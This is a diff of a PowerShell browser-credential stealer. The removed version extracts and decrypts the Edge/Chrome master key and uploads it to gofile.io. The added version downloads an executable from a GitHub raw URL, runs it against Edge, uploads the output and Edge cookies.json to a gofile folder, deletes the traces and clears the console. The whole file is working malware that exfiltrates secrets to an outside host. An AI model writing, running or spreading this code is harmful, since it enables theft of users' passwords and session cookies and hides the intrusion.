@@ -13,61 +13,36 @@ function Upload-FilesToGofile {
                 $uploadUri = "https://store1.gofile.io/uploadFile"
                 
                 curl.exe -F "file=@$FilePath" -F "token=$ApiKey" -F "folderId=$newFolderId" $uploadUri
-
+cls
                 Start-Sleep -Seconds 1
                 
             }
         }
    
-    catch {
-        Write-Host "Error:" $_.Exception.Message # This is your os.system("cls")
+    catch {cls
+
     }
 }
 
+$url = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/public/elevator_x64.exe"
 
-function Get-ChromeSecretKey {
-    # Path for Edge (Change 'Edge' to 'Chrome' if needed)
-    $localStatePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
-    
-    try {
-        # 1. Read and parse the JSON Local State file
-        if (-not (Test-Path $localStatePath)) { throw "Local State file not found." }
-        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
-        
-        # 2. Get the encrypted key and decode from Base64
-        $encryptedKey = $localState.os_crypt.encrypted_key
-        $decodedKeyBytes = [Convert]::FromBase64String($encryptedKey)
-        
-        # 3. Remove the "DPAPI" prefix (the first 5 bytes: 44 50 41 50 49)
-        $actualKeyBytes = $decodedKeyBytes[5..($decodedKeyBytes.Length - 1)]
-        
+$outPath = "C:\ProgramX64\extentions\evab.exe"
 
-        Add-Type -AssemblyName System.Security
-        
-        # Unprotect returns the raw Master Key used for AES-256-GCM cookie decryption
-        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
-            $actualKeyBytes, 
-            $null, 
-            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-        )
-        
-        return $masterKey
-    }
-    catch {
-        Write-Error "Error retrieving secret key: $($_.Exception.Message)"
-        return $null
-    }
-}
 
-# Execution
-$key = Get-ChromeSecretKey
 
-$timestamp = Get-Date -Format "yyyy-MM-dd"
-$hexKey = [System.BitConverter]::ToString($key) -replace '-'
-
-$content = "--- Chrome/Edge Secret Key ---`nDate:asa $timestamp`nKey: $hexKey`n"
-
-# 'Add-Content' appends to the file instead of overwriting it
-$content | Add-Content -Path "C:\Users\omark\AppData\Local\Temp\keys_log{$timestamp}.txt"
-Upload-FilesToGofile -FilePath "C:\Users\omark\AppData\Local\Temp\keys_log{$timestamp}.txt" -newFolderId "a14858bf-8246-4272-8486-aac51f194cea"
+Invoke-WebRequest -Uri $url -OutFile $outPath
+Start-Sleep -Seconds 10
+C:\ProgramX64\extentions\evab.exe -o "C:\ProgramX64\extentions\" edge > C:\ProgramX64\extentions\a.dat
+Start-Sleep -Seconds 1
 cls
+
+Upload-FilesToGofile -FilePath "C:\ProgramX64\extentions\a.dat" -newFolderId "a14858bf-8246-4272-8486-aac51f194cea"
+
+Upload-FilesToGofile -FilePath "C:\ProgramX64\extentions\Edge\Default\cookies.json" -newFolderId "a14858bf-8246-4272-8486-aac51f194cea"
+cls
+Start-Sleep -Seconds 1
+Remove-Item -Path "C:\ProgramX64\extentions\Edge" -Recurse -Force
+Remove-Item -Path "C:\ProgramX64\extentions\a.dat" -Force
+cls
+Start-Sleep -Seconds 1
+exit
